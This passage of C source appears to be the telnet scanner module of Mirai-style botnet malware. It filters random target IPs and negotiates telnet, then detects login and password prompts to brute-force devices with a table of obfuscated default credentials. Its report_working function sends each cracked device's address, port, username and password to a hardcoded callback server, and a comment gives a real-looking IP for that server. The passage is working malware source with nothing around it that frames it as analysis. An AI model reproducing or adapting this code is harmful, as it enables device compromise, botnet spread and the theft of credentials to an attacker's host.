            (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
            (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
          );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    size_t consumed = 0;
    unsigned char *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                unsigned char tmp1[3] = {255, 251, 31};
                unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    ssize_t i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    ssize_t i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (unsigned char *)"ogin\xFF\0\xFF", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (unsigned char *)"enter\xFF\0\xFF", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    ssize_t i, prompt_ending = -1;
    prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }
    if (prompt_ending == -1)
    {
        int tmp = -1;
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (unsigned char *)"assword\xFF\0\xFF", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    ssize_t prompt_ending = -1;
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, (unsigned char *)"ncorrect\xFF\0\xFF", 8) != -1)
    {
        return -1;
    }

    prompt_ending = -1;
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (unsigned char *)"boat: applet not found\xFF\0\xFF", 22);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

void scanner_add_auth_entry(unsigned char *enc_user, unsigned char *enc_pass)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (unsigned char)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (unsigned char)tmp;
    #ifdef DEBUG
    printf("(scanner) added entry %d: %s:%s\r\n", auth_table_len, auth_table[auth_table_len].username, auth_table[auth_table_len].password);
    #endif
    auth_table_len++;
}

void scanner_clear_auth_entry(void)
{
    if(auth_table != NULL)
    {
        int x;
        for(x = 0; x < auth_table_len; x++)
        {
            free(auth_table[x].username);
            auth_table[x].username = NULL;
            free(auth_table[x].password);
            auth_table[x].password = NULL;
        }
        free(auth_table);
        auth_table = NULL;
    }
    auth_table_len = 0;
}

static struct scanner_auth *random_auth_entry(void)
{
    int r = (rand_next() % auth_table_len);
    return &(auth_table[r]);
}

static void report_working(uint32_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int fd;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        return;
    }

    addr.sin_family = AF_INET;                       //85.31.45.232
    addr.sin_addr.s_addr = REPORT_IP;
    addr.sin_port = htons(REPORT_PORT);
    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        return;
    }

    unsigned char zero = 0;
    send(fd, &zero, sizeof (unsigned char), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (uint32_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (unsigned char), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (unsigned char), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    fd = -1;

    return;
}

static unsigned char *deobf(unsigned char *str, int *len)
{
    //int i;
    unsigned char *cpy = NULL;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_zero(cpy, *len + 1);
    util_memcpy(cpy, str, *len + 1);

    return cpy;
}

static unsigned char can_consume(struct scanner_connection *conn, unsigned char *ptr, int amount)
{
    unsigned char *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
